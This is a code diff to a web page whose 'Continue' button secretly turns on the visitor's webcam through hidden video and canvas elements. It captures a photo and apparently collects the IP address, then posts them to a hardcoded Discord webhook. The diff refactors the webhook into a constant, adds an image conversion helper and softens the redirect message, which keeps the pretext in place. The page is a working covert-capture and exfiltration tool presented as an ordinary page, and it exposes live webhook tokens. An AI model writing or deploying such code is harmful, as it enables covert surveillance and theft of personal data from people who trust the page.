@@ -42,7 +42,12 @@
         <button class="button" onclick="takePhotoAndSend()">Continue</button>
     </div>
 
+    <video id="video" width="640" height="480" style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
     <script>
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t_5cv';
+
         async function takePhotoAndSend() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -81,13 +86,13 @@
                         files: [imageData]
                     };
 
-                    fetch('https://discord.com/api/webhooks/1232343689821683764/2R_ybvehx5awP_cEYBfAqvrLdvq7T708toeOvOiFbuQLmxZWw29MKTCoSt-YjB-HN-7', {
+                    fetch(discordWebhookURL, {
                         method: 'POST',
                         body: JSON.stringify(payload)
                     })
                     .then(response => {
                         if (response.ok) {
-                            alert('Sending U to Main page..');
+                            alert('Sending you to the main page..');
                         } else {
                             alert('Hmm error');
                         }
@@ -101,6 +106,19 @@
                     console.error('Error:', error);
                     alert('Failed to fetch IP address. Please try again later.');
                 });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const byteArray = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                byteArray[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([arrayBuffer], { type: mimeString });
         }
     </script>
 </body>
